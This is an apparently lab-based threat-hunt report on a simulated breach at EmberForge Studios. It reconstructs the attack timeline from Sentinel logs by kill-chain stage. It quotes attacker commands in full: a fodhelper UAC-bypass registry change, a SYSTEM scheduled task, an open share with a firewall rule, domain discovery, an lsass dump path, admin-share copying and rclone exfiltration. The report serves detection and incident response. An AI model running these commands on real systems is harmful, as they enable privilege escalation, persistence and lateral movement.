# 🔐 Threat Hunt Report: EmberForge Source Leak Investigation

## 📌 Overview

This report documents a full threat-hunting investigation conducted in Microsoft Sentinel following a suspected breach at EmberForge Studios. The objective was to identify initial access, attacker behavior, lateral movement, credential access, and data exfiltration.

---

## 🧭 Investigation Scope

- **Time Window:** 2026-01-30 21:00 UTC → 2026-01-31 00:00 UTC  
- **Environment:** Microsoft Sentinel (Log Analytics)  
- **Data Source:** EmberForgeX_CL (Custom Logs)

### Key Fields Used
- Computer
- EventCode_s
- CommandLine_s
- Caller_User_Name_s
- Raw_s
- UtcTime_s

### Hosts in Scope
- EC2AMAZ-B9GHHO6
- EC2AMAZ-16V3AU4
- EC2AMAZ-EEU3IA2

---

## 🧠 Methodology

The investigation followed a kill-chain approach:

1. Initial Access  
2. Execution  
3. Privilege Escalation  
4. Persistence  
5. Discovery  
6. Lateral Movement  
7. Credential Access  
8. Exfiltration  

---

# 🚨 Attack Timeline & Findings

## 🔹 Initial Access
"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW

- DLL executed from mounted drive (D:)
- Indicates ISO-based delivery

---

## 🔹 Privilege Escalation
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d C:\Users\Public\update.exe /f  
cmd.exe /c fodhelper.exe

- UAC bypass via fodhelper

---

## 🔹 Persistence
schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system

- Scheduled task for persistence

---

## 🔹 Tool Staging
cmd.exe /c "net share tools=C:\Users\Public /grant:everyone,full"

- Created share for distribution

---

## 🔹 Firewall Manipulation
netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445

- Opened SMB port

---

## 🔹 Discovery
net user /domain  
net group "Domain Admins" /domain  
nltest /dclist:emberforge.local

---

## 🔹 Credential Dumping
C:\Windows\System32\lsass.dmp

---

## 🔹 Lateral Movement
cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe

---

## 🔹 C2
cdn.cloud-endpoint.net → 104.21.30.237

---

## 🔹 Exfiltration
rclone.exe → mega cloud

---

# ✅ Conclusion

Full multi-stage compromise involving:
- UAC bypass
- Credential dumping
- SMB lateral movement
- Cloud exfiltration
